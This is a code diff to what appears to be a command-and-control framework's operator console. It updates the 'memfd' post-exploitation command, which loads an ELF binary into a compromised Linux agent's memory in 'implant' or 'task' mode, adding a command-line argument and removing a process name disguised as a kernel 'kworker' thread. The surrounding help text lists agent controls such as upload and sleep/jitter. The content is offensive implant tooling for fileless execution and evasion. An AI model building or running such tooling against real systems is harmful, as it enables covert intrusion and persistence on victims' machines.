@@ -238,9 +238,10 @@ def print_agent_help(os):
     upload <local-file> <remote-path>      ->  upload a file to the agent (wrap paths with quotes)
     
     --== Post Exploitation Stuff ==--
-    memfd <implant/task> <elf-file>        ->  load elf in-memory using the memfd_create syscall
+    memfd <mode> <elf-file> <commandline>  ->  load elf in-memory using the memfd_create syscall
                                                implant mode: load the elf as a child process and return
-                                               load the elf as a child process, wait on it, and get its output when it's done
+                                               task mode: load the elf as a child process, wait on it, and get its output when it's done
+                                               (pass the whole commandline as a single string using quotes)
     
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
@@ -561,16 +562,16 @@ def agent_screen_linux(agent_id):
                 args = re.sub(r"\s*memfd\s+", "", command, 1)
                 mode = shlex.split(args)[0]
                 elf_file = shlex.split(args)[1]
+                command_line = shlex.split(args)[2]
                 elf_file_content = utils.read_file(elf_file)
                 if not elf_file_content:
                     continue
                 else:
                     elf_file_data_base64 = utils.encode_base_64(elf_file_content, encoding="utf-8")
-                fake_process_name = f"kworker/[{random.randint(0, 4)}:{random.randint(0, 4)}]"
                 command_dict = {
                     "command_type": "memfd",
                     "mode": mode,
-                    "fake_process_name": fake_process_name,
+                    "command_line": command_line,
                     "elf_file_data_base64": elf_file_data_base64
                 }
 
